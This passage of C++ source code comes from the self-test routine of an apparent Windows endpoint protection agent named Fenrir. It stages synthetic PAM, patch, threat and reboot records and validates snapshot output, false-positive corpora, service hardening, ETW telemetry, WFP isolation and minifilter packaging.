                     L"Endpoint snapshot surfaced pending PAM requests and PAM health posture from local runtime paths.");
          } else {
            AddCheck(report, L"phase5_pam_request_queue_visibility", L"Phase 5 PAM request queue visibility",
                     SelfTestStatus::Fail,
                     L"Endpoint snapshot did not surface pending PAM request state from the staged runtime payload.",
                     L"Validate PAM request-path resolution and snapshot projection before promoting Phase 5.");
          }

          if (phase5Snapshot.pamApprovedCount >= 1 && phase5Snapshot.pamDeniedCount >= 1) {
            AddCheck(report, L"phase5_pam_audit_visibility", L"Phase 5 PAM audit visibility", SelfTestStatus::Pass,
                     L"Endpoint snapshot exposed PAM approval/denial counts from the local audit journal.");
          } else {
            AddCheck(report, L"phase5_pam_audit_visibility", L"Phase 5 PAM audit visibility", SelfTestStatus::Fail,
                     L"Endpoint snapshot did not surface both approval and denial PAM audit outcomes from the staged journal.",
                     L"Validate PAM audit journal parsing so elevation approvals and denials stay visible to users and support workflows.");
          }

          if (phase5Snapshot.localAdminExposureKnown) {
            AddCheck(report, L"phase5_admin_membership_audit", L"Phase 5 local-admin membership audit",
                     SelfTestStatus::Pass,
                     L"Fenrir resolved local Administrators membership posture with " +
                         std::to_wstring(phase5Snapshot.localAdminMemberCount) +
                         L" member(s); exposure state is " +
                         std::wstring(phase5Snapshot.localAdminExposure ? L"elevated" : L"reduced") + L".");
          } else {
            AddCheck(report, L"phase5_admin_membership_audit", L"Phase 5 local-admin membership audit",
                     SelfTestStatus::Warning,
                     L"Fenrir could not resolve local Administrators membership posture in this host context.",
                     L"Run self-test from a host context that allows local group membership enumeration.");
          }
        }
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase5_pam_request_queue_visibility", L"Phase 5 PAM request queue visibility",
               SelfTestStatus::Fail, L"Phase 5 PAM request visibility validation failed: " + Utf8ToWide(error.what()),
               L"Validate PAM runtime path staging and snapshot projection before rerunning self-test.");
      AddCheck(report, L"phase5_pam_audit_visibility", L"Phase 5 PAM audit visibility", SelfTestStatus::Fail,
               L"Phase 5 PAM audit visibility validation failed: " + Utf8ToWide(error.what()),
               L"Validate PAM journal parsing and snapshot projection before rerunning self-test.");
      AddCheck(report, L"phase5_admin_membership_audit", L"Phase 5 local-admin membership audit",
               SelfTestStatus::Fail, L"Phase 5 local-admin membership validation failed: " + Utf8ToWide(error.what()),
               L"Validate local-admin posture collection before rerunning self-test.");
    }

    try {
      auto phase6Config = config;
      phase6Config.runtimeDatabasePath = phaseValidationRoot / L"phase6-runtime.db";
      phase6Config.stateFilePath = phaseValidationRoot / L"phase6-state.ini";
      phase6Config.telemetryQueuePath = phaseValidationRoot / L"phase6-telemetry.tsv";
      phase6Config.updateRootPath = phaseValidationRoot / L"phase6-updates";
      phase6Config.journalRootPath = phaseValidationRoot / L"phase6-journal";
      phase6Config.quarantineRootPath = phaseValidationRoot / L"phase6-quarantine";
      phase6Config.evidenceRootPath = phaseValidationRoot / L"phase6-evidence";
      phase6Config.scanExcludedPaths.clear();

      std::error_code phase6PathError;
      std::filesystem::create_directories(phase6Config.runtimeDatabasePath.parent_path(), phase6PathError);
      std::filesystem::create_directories(phase6Config.journalRootPath, phase6PathError);
      std::filesystem::create_directories(phase6Config.updateRootPath, phase6PathError);
      std::filesystem::create_directories(phase6Config.quarantineRootPath, phase6PathError);
      std::filesystem::create_directories(phase6Config.evidenceRootPath, phase6PathError);

      if (phase6PathError) {
        AddCheck(report, L"phase6_integrated_posture_snapshot", L"Phase 6 integrated posture snapshot",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 6 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, patch, and journal roots are writable before running Phase 6 integration checks.");
        AddCheck(report, L"phase6_posture_output_coverage", L"Phase 6 local posture output coverage",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 6 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, patch, and journal roots are writable before running Phase 6 integration checks.");
      } else {
        RuntimeDatabase phase6Database(phase6Config.runtimeDatabasePath);
        phase6Database.RecordScanHistory(ScanHistoryRecord{
            .recordedAt = CurrentUtcTimestamp(),
            .source = L"realtime-broker",
            .subjectPath = phaseValidationRoot / L"phase6-threat-sample.ps1",
            .sha256 = L"phase6-threat-sha256",
            .contentType = L"script",
            .reputation = L"user-writable-unsigned",
            .disposition = L"block",
            .confidence = 98,
            .tacticId = L"TA0040",
            .techniqueId = L"T1486",
            .remediationStatus = L"pending",
            .evidenceRecordId = L"phase6-evidence-1",
            .quarantineRecordId = L""});

        phase6Database.ReplaceWindowsUpdateRecords({WindowsUpdateRecord{
            .updateId = L"phase6-kb5040001",
            .revision = L"1",
            .title = L"2026-05 Security Cumulative Update",
            .kbArticles = L"KB5040001",
            .categories = L"Security Updates",
            .classification = L"security",
            .severity = L"Critical",
            .updateType = L"software",
            .deploymentAction = L"installation",
            .discoveredAt = CurrentUtcTimestamp(),
            .lastAttemptAt = CurrentUtcTimestamp(),
            .status = L"failed",
            .failureCode = L"0x80240022",
            .detailJson = L"{\"phase\":\"install\"}",
            .installed = false,
            .hidden = false,
            .downloaded = true,
            .mandatory = true,
            .browseOnly = false,
            .rebootRequired = true,
            .driver = false,
            .featureUpdate = false,
            .optional = false}});

        phase6Database.ReplaceSoftwarePatchRecords({
            SoftwarePatchRecord{
                .softwareId = L"phase6-manual-app",
                .displayName = L"Contoso Legacy Tool",
                .displayVersion = L"3.2",
                .availableVersion = L"3.3",
                .publisher = L"Contoso",
                .provider = L"manual",
                .providerId = L"",
                .supportedSource = L"manual",
                .updateState = L"manual",
                .updateSummary = L"User interaction required.",
                .lastCheckedAt = CurrentUtcTimestamp(),
                .manualOnly = true,
                .userInteractionRequired = true,
                .highRisk = true},
            SoftwarePatchRecord{
                .softwareId = L"phase6-unsupported-app",
                .displayName = L"Unsupported Utility",
                .displayVersion = L"1.0",
                .availableVersion = L"",
                .publisher = L"Legacy Publisher",
                .provider = L"manual",
                .providerId = L"",
                .supportedSource = L"unsupported",
                .updateState = L"unsupported",
                .updateSummary = L"No trusted update source.",
                .lastCheckedAt = CurrentUtcTimestamp(),
                .supported = false}});

        phase6Database.UpsertPatchHistoryRecord(PatchHistoryRecord{
            .recordId = L"phase6-history-1",
            .targetType = L"windows-update",
            .targetId = L"phase6-kb5040001",
            .title = L"2026-05 Security Cumulative Update",
            .provider = L"windows-update-agent",
            .action = L"install",
            .status = L"failed",
            .startedAt = CurrentUtcTimestamp(),
            .completedAt = CurrentUtcTimestamp(),
            .errorCode = L"0x80240022",
            .detailJson = L"{\"stage\":\"install\"}",
            .rebootRequired = true});

        phase6Database.SaveRebootCoordinator(RebootCoordinatorRecord{
            .rebootRequired = true,
            .pendingWindowsUpdate = true,
            .pendingFileRename = false,
            .pendingComputerRename = false,
            .pendingComponentServicing = true,
            .rebootReasons = L"windows_update;component_servicing",
            .detectedAt = CurrentUtcTimestamp(),
            .deferredUntil = L"",
            .gracePeriodMinutes = 120,
            .status = L"pending"});

        const auto phase6RuntimeRoot = phase6Config.runtimeDatabasePath.parent_path();
        const auto phase6RequestPath = phase6RuntimeRoot / L"pam-request.json";
        const auto phase6AuditPath = phase6Config.journalRootPath / L"privilege-requests.jsonl";
        const auto phase6RequestPayload =
            L"{\"requestedAt\":\"" + JsonEscape(CurrentUtcTimestamp()) +
          L"\",\"requester\":\"selftest-user\",\"action\":\"run_windows_update\",\"targetPath\":\"C:\\\\Windows\\\\System32\\\\control.exe\",\"arguments\":\"\",\"reason\":\"Phase 6 patch workflow request\"}";
        const auto phase6AuditPayload =
            L"{\"timestamp\":\"" + JsonEscape(CurrentUtcTimestamp()) +
            L"\",\"requestedAt\":\"" + JsonEscape(CurrentUtcTimestamp()) +
          L"\",\"requester\":\"selftest-user\",\"action\":\"run_windows_update\",\"target\":\"C:\\\\Windows\\\\System32\\\\control.exe\",\"reason\":\"Phase 6 patch workflow request\",\"decision\":\"approved\",\"detail\":\"Launched process id 5151\",\"approvalSource\":\"policy\",\"durationSeconds\":0,\"terminationOutcome\":\"completed\"}\n";

        if (!WriteSelfTestUtf8File(phase6RequestPath, phase6RequestPayload) ||
            !WriteSelfTestUtf8File(phase6AuditPath, phase6AuditPayload)) {
          AddCheck(report, L"phase6_integrated_posture_snapshot", L"Phase 6 integrated posture snapshot",
                   SelfTestStatus::Fail,
                   L"Self-test could not stage PAM integration artifacts for Phase 6 snapshot validation.",
                   L"Validate PAM runtime and journal path permissions before rerunning Phase 6 checks.");
          AddCheck(report, L"phase6_posture_output_coverage", L"Phase 6 local posture output coverage",
                   SelfTestStatus::Fail,
                   L"Self-test could not stage PAM integration artifacts for Phase 6 snapshot validation.",
                   L"Validate PAM runtime and journal path permissions before rerunning Phase 6 checks.");
        } else {
          const auto phase6Snapshot = LoadEndpointClientSnapshot(phase6Config, 20, 20, 20, 20);

          const auto hasFailedWindowsUpdate = std::any_of(
              phase6Snapshot.windowsUpdates.begin(), phase6Snapshot.windowsUpdates.end(),
              [](const auto& update) { return update.updateId == L"phase6-kb5040001" && update.status == L"failed"; });
          const auto manualSoftwareCount = std::count_if(
              phase6Snapshot.softwarePatches.begin(), phase6Snapshot.softwarePatches.end(),
              [](const auto& software) { return software.manualOnly || software.updateState == L"manual"; });
          const auto unsupportedSoftwareCount = std::count_if(
              phase6Snapshot.softwarePatches.begin(), phase6Snapshot.softwarePatches.end(),
              [](const auto& software) { return !software.supported || software.updateState == L"unsupported"; });

          if (phase6Snapshot.openThreatCount >= 1 && hasFailedWindowsUpdate &&
              phase6Snapshot.rebootCoordinator.rebootRequired && phase6Snapshot.pendingPamRequestCount >= 1 &&
              phase6Snapshot.pamApprovedCount >= 1 && phase6Snapshot.localAdminExposureKnown) {
            AddCheck(report, L"phase6_integrated_posture_snapshot", L"Phase 6 integrated posture snapshot",
                     SelfTestStatus::Pass,
                     L"Unified endpoint snapshot exposed threat, patch debt, reboot state, PAM queue/history, and local-admin posture signals together.");
          } else {
            AddCheck(report, L"phase6_integrated_posture_snapshot", L"Phase 6 integrated posture snapshot",
                     SelfTestStatus::Fail,
                     L"Unified endpoint snapshot did not preserve all cross-feature protection signals required for Phase 6 integration.",
                     L"Validate endpoint snapshot projection so AV, patching, PAM, reboot, and admin posture state remain visible in one local model.");
          }

          if (!phase6Snapshot.patchHistory.empty() && manualSoftwareCount >= 1 && unsupportedSoftwareCount >= 1 &&
              !phase6Snapshot.windowsUpdates.empty() && phase6Snapshot.pamApprovedCount >= 1) {
            AddCheck(report, L"phase6_posture_output_coverage", L"Phase 6 local posture output coverage",
                     SelfTestStatus::Pass,
                     L"Local posture output preserved patch history, manual/unsupported software debt, Windows update status, and PAM decision history for dashboard/reporting surfaces.");
          } else {
            AddCheck(report, L"phase6_posture_output_coverage", L"Phase 6 local posture output coverage",
                     SelfTestStatus::Fail,
                     L"Local posture output is missing one or more required integration surfaces for patch, PAM, or compliance reporting.",
                     L"Validate posture projection so dashboard and reporting views can explain missing patches, reboot risk, PAM outcomes, and admin exposure.");
          }
        }
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase6_integrated_posture_snapshot", L"Phase 6 integrated posture snapshot",
               SelfTestStatus::Fail, L"Phase 6 integrated snapshot validation failed: " + Utf8ToWide(error.what()),
               L"Validate endpoint snapshot integration for AV, patching, PAM, and admin posture signals before rerunning self-test.");
      AddCheck(report, L"phase6_posture_output_coverage", L"Phase 6 local posture output coverage",
               SelfTestStatus::Fail, L"Phase 6 posture output validation failed: " + Utf8ToWide(error.what()),
               L"Validate local posture output projection and dashboard/reporting coverage before rerunning self-test.");
    }

    std::error_code cleanupError;
    std::filesystem::remove_all(phaseValidationRoot, cleanupError);
  }

  const auto corpusFileLimit = ResolveCorpusFileLimit();
  const auto runOptionalCorpusCheck = [&report, corpusFileLimit](const std::wstring& checkId,
                                                                  const std::wstring& checkName,
                                                                  const wchar_t* envVarName,
                                                                  const std::wstring& corpusLabel) {
    const auto configuredPath = ReadEnvironmentVariable(envVarName);
    if (configuredPath.empty()) {
      AddCheck(report, checkId, checkName, SelfTestStatus::Warning,
               corpusLabel + L" corpus path is not configured for this self-test run.",
               std::wstring(L"Set ") + envVarName + L" to a trusted corpus root and rerun --self-test.");
      return;
    }

    const std::filesystem::path corpusRoot(configuredPath);
    std::error_code error;
    if (!std::filesystem::exists(corpusRoot, error) || error) {
      AddCheck(report, checkId, checkName, SelfTestStatus::Fail,
               corpusLabel + L" corpus path does not exist: " + corpusRoot.wstring() + L".",
               std::wstring(L"Update ") + envVarName + L" to an existing corpus path.");
      return;
    }

    bool truncated = false;
    const auto sampleFiles = CollectCorpusSampleFiles(corpusRoot, corpusFileLimit, &truncated);
    if (sampleFiles.empty()) {
      AddCheck(report, checkId, checkName, SelfTestStatus::Fail,
               corpusLabel + L" corpus path did not yield any readable files: " + corpusRoot.wstring() + L".",
               L"Ensure the corpus contains readable files and rerun self-test from the same host context.");
      return;
    }

    auto corpusPolicy = CreateDefaultPolicySnapshot();
    corpusPolicy.cloudLookupEnabled = false;
    corpusPolicy.quarantineOnMalicious = false;

    const auto findings = ScanTargets(sampleFiles, corpusPolicy);
    if (findings.empty()) {
      std::wstring details = L"Validated ";
      details += std::to_wstring(sampleFiles.size());
      details += L" ";
      details += corpusLabel;
      details += L" corpus file(s) without false-positive findings.";
      if (truncated) {
        details += L" Scan was limited to first ";
        details += std::to_wstring(corpusFileLimit);
        details += L" files.";
      }

      AddCheck(report, checkId, checkName, SelfTestStatus::Pass, details);
      return;
    }

    std::wstring details = L"Detected ";
    details += std::to_wstring(findings.size());
    details += L" false-positive candidate(s) in the ";
    details += corpusLabel;
    details += L" corpus.";
    const auto sampleCount = std::min<std::size_t>(findings.size(), 3);
    for (std::size_t index = 0; index < sampleCount; ++index) {
      const auto& finding = findings[index];
      details += L" Sample ";
      details += std::to_wstring(index + 1);
      details += L": ";
      details += finding.path.wstring();
      details += L" (";
      details += VerdictDispositionToString(finding.verdict.disposition);
      details += L", reason ";
      details += FirstReasonCode(finding);
      details += L").";
    }

    AddCheck(report, checkId, checkName, SelfTestStatus::Fail, details,
             L"Review suppression/reputation tuning for these cleanware artifacts before pilot rollout.");
  };

  runOptionalCorpusCheck(L"phase1_cleanware_corpus", L"Phase 1 cleanware corpus",
                         L"ANTIVIRUS_PHASE1_CLEANWARE_CORPUS_PATH", L"cleanware");
  runOptionalCorpusCheck(L"phase1_uk_business_software_corpus", L"Phase 1 UK business software corpus",
                         L"ANTIVIRUS_PHASE1_UK_BUSINESS_CORPUS_PATH", L"UK business software");

  const auto hardeningManager = HardeningManager(config, installRoot);
  const auto hardeningStatus = hardeningManager.QueryStatus();
  AddCheck(report, L"hardening", L"Service hardening",
           hardeningStatus.registryConfigured && hardeningStatus.runtimePathsTrusted &&
                   hardeningStatus.runtimePathsProtected
               ? SelfTestStatus::Pass
               : SelfTestStatus::Warning,
           hardeningStatus.statusMessage.empty() ? L"Hardening status is available." : hardeningStatus.statusMessage,
           L"Run fenrir-agent-service.exe --repair from an elevated context to reapply registry and ACL hardening.");

  AddCheck(report, L"protected_service", L"Protected-service posture",
           hardeningStatus.launchProtectedConfigured
               ? SelfTestStatus::Pass
               : (!hardeningStatus.elamDriverPresent && config.elamDriverPath.empty() ? SelfTestStatus::Warning
                                                                                       : SelfTestStatus::Fail),
           hardeningStatus.launchProtectedConfigured
               ? L"The antimalware-light protected-service posture is configured."
               : (hardeningStatus.elamDriverPresent || !config.elamDriverPath.empty()
                      ? L"An ELAM path is configured, but launch-protected service mode is not active."
                      : L"No ELAM driver is configured in this environment."),
           L"Supply a signed ELAM driver and run --repair --elam-driver <path> from an elevated installer context.");

  const auto wscSnapshot = WscCoexistenceManager().CaptureSnapshot();
  AddCheck(report, L"coexistence", L"Windows coexistence snapshot",
           wscSnapshot.available ? SelfTestStatus::Pass : SelfTestStatus::Warning,
           wscSnapshot.available ? L"WSC health: " + wscSnapshot.providerHealth : wscSnapshot.errorMessage,
           L"Validate this from a Windows client endpoint with the Security Center service available.");

  try {
    auto etwConfig = config;
    ProcessEtwSensor sensor(etwConfig);
    sensor.Start();
    std::this_thread::sleep_for(std::chrono::milliseconds(350));
    sensor.Stop();
    auto telemetry = sensor.DrainTelemetry();
    const auto started =
        std::find_if(telemetry.begin(), telemetry.end(), [](const auto& record) { return record.eventType == L"process.etw.started"; });
    const auto failed =
        std::find_if(telemetry.begin(), telemetry.end(), [](const auto& record) { return record.eventType == L"process.etw.failed"; });
    if (started != telemetry.end()) {
      AddCheck(report, L"etw_process_sensor", L"ETW process telemetry", SelfTestStatus::Pass, started->summary);
    } else if (failed != telemetry.end()) {
      AddCheck(report, L"etw_process_sensor", L"ETW process telemetry",
               IsProbablyPrivilegeBoundary(failed->summary) || failed->payloadJson.find(L"\"error\":5") != std::wstring::npos
                   ? SelfTestStatus::Warning
                   : SelfTestStatus::Fail,
               failed->summary,
               L"Run the sensor under the Windows service account or an elevated context to validate kernel ETW access.");
    } else {
      AddCheck(report, L"etw_process_sensor", L"ETW process telemetry", SelfTestStatus::Warning,
               L"The ETW sensor did not emit a start or failure state event during self-test.",
               L"Validate the kernel ETW session from an elevated service context.");
    }
  } catch (const std::exception& error) {
    AddCheck(report, L"etw_process_sensor", L"ETW process telemetry", SelfTestStatus::Fail, Utf8ToWide(error.what()),
             L"Check TDH/ETW dependencies and validate under the SCM service context.");
  }

  try {
    auto wfpConfig = config;
    NetworkIsolationManager networkManager(wfpConfig);
    networkManager.Start();
    std::wstring isolationError;
    bool isolationToggled = false;
    if (networkManager.EngineReady()) {
      isolationToggled = networkManager.ApplyIsolation(true, &isolationError);
      if (isolationToggled) {
        networkManager.ApplyIsolation(false, nullptr);
      }
    }
    auto telemetry = networkManager.DrainTelemetry();
    networkManager.Stop();

    const auto failed =
        std::find_if(telemetry.begin(), telemetry.end(), [](const auto& record) { return record.eventType == L"network.wfp.failed"; });
    if (networkManager.EngineReady() && isolationToggled) {
      AddCheck(report, L"wfp_isolation", L"WFP isolation manager", SelfTestStatus::Pass,
               L"The WFP manager opened the filtering engine and applied/released host isolation.");
    } else if (failed != telemetry.end()) {
      AddCheck(report, L"wfp_isolation", L"WFP isolation manager",
               (!elevated || IsProbablyPrivilegeBoundary(failed->summary) ||
                failed->payloadJson.find(L"\"error\":5") != std::wstring::npos)
                   ? SelfTestStatus::Warning
                   : SelfTestStatus::Fail,
               failed->summary,
               L"Validate WFP provider registration and isolation from an elevated service or SYSTEM context.");
    } else if (!isolationError.empty()) {
      AddCheck(report, L"wfp_isolation", L"WFP isolation manager", elevated ? SelfTestStatus::Fail : SelfTestStatus::Warning,
               isolationError, L"Run the self-test from an elevated context that can open the WFP engine.");
    } else {
      AddCheck(report, L"wfp_isolation", L"WFP isolation manager", elevated ? SelfTestStatus::Fail : SelfTestStatus::Warning,
               L"The WFP manager did not reach an engine-ready state in this context.",
               L"Validate the network containment path from the installed Windows service.");
    }
  } catch (const std::exception& error) {
    AddCheck(report, L"wfp_isolation", L"WFP isolation manager", SelfTestStatus::Fail, Utf8ToWide(error.what()),
             L"Check WFP dependencies, ACLs, and service privileges.");
  }

  const auto minifilterInf = installRoot / L"driver" / L"AntivirusMinifilter.inf";
  const auto minifilterSys = installRoot / L"driver" / L"AntivirusMinifilter.sys";
  const auto minifilterServiceState = QueryServiceState(kMinifilterServiceName);
  const auto minifilterArtifactsPresent = PathExists(minifilterInf) || PathExists(minifilterSys);
  AddCheck(report, L"minifilter", L"Minifilter package",
           !minifilterServiceState.empty() ? SelfTestStatus::Pass
                                           : (minifilterArtifactsPresent ? SelfTestStatus::Warning : SelfTestStatus::Fail),
           !minifilterServiceState.empty()
               ? L"The minifilter service is registered with state " + minifilterServiceState + L"."
               : (minifilterArtifactsPresent ? L"Driver packaging artifacts are present, but the minifilter service is not installed."
                                            : L"No built minifilter artifacts were found beside the agent binaries."),
           L"Build the driver with the WDK, sign the .sys/.cat, and stage AntivirusMinifilter.inf/.sys into the release package.");

  const auto serviceState = QueryServiceState(L"FenrirAgent");
  AddCheck(report, L"service_registration", L"Windows service registration",
           !serviceState.empty() ? SelfTestStatus::Pass : SelfTestStatus::Warning,
           !serviceState.empty() ? L"The FenrirAgent service is registered with state " + serviceState + L"."
                                 : L"The FenrirAgent service is not installed in the SCM on this host.",
           L"Run fenrir-agent-service.exe --install from an elevated install context.");

  const auto runtimeRoot = runtimeValidation.runtimeRootPath.empty() ? config.runtimeDatabasePath.parent_path()
                                                                      : runtimeValidation.runtimeRootPath;
  const auto addRuntimeRootAvailabilityCheck = [&report](const std::wstring& id, const std::wstring& name,
                                                          const std::filesystem::path& rootPath,
                                                          const std::wstring& remediation) {
    std::error_code error;
    std::filesystem::create_directories(rootPath, error);
    if (!error && PathExists(rootPath)) {
      AddCheck(report, id, name, SelfTestStatus::Pass, L"The root is available at " + rootPath.wstring() + L".");
      return;
    }

    AddCheck(report, id, name, SelfTestStatus::Fail,
             L"The root could not be prepared at " + rootPath.wstring() + L".", remediation);
  };

  addRuntimeRootAvailabilityCheck(L"runtime_root", L"Runtime root", runtimeRoot,
                                  L"Ensure the configured runtime root is writable before starting the service.");
  addRuntimeRootAvailabilityCheck(L"update_root", L"Update staging root", config.updateRootPath,
                                  L"Ensure the runtime update directory is writable before testing rollback-aware upgrades.");
  addRuntimeRootAvailabilityCheck(L"quarantine_root", L"Quarantine root", config.quarantineRootPath,
                                  L"Ensure local quarantine storage is writable by the service account.");
  addRuntimeRootAvailabilityCheck(L"evidence_root", L"Evidence root", config.evidenceRootPath,
                                  L"Ensure local evidence storage is writable by the service account.");
  addRuntimeRootAvailabilityCheck(L"journal_root", L"Journal root", config.journalRootPath,
                                  L"Ensure the local journal path is writable for audit and recovery events.");

  const auto failures = std::count_if(report.checks.begin(), report.checks.end(),
                                      [](const auto& check) { return check.status == SelfTestStatus::Fail; });
  const auto warnings = std::count_if(report.checks.begin(), report.checks.end(),
                                      [](const auto& check) { return check.status == SelfTestStatus::Warning; });
  report.overallStatus = failures > 0 ? L"fail" : warnings > 0 ? L"warning" : L"pass";
  return report;
}

std::wstring SelfTestReportToJson(const SelfTestReport& report) {
  std::wstring json = L"{\"generatedAt\":\"" + JsonEscape(report.generatedAt) + L"\",\"overallStatus\":\"" +
                      JsonEscape(report.overallStatus) + L"\",\"checks\":[";
  for (std::size_t index = 0; index < report.checks.size(); ++index) {
    const auto& check = report.checks[index];
    if (index != 0) {
      json += L",";
    }
    json += L"{\"id\":\"" + JsonEscape(check.id) + L"\",\"name\":\"" + JsonEscape(check.name) + L"\",\"status\":\"" +
            JsonEscape(StatusToString(check.status)) + L"\",\"details\":\"" + JsonEscape(check.details) +
            L"\",\"remediation\":\"" + JsonEscape(check.remediation) + L"\"}";
  }
  json += L"]}";
  return json;
}

int SelfTestExitCode(const SelfTestReport& report) {
  const auto failures = std::count_if(report.checks.begin(), report.checks.end(),
                                      [](const auto& check) { return check.status == SelfTestStatus::Fail; });
  if (failures > 0) {
    return 2;
  }

  const auto warnings = std::count_if(report.checks.begin(), report.checks.end(),
                                      [](const auto& check) { return check.status == SelfTestStatus::Warning; });
  return warnings > 0 ? 1 : 0;
}

}  // namespace antivirus::agent
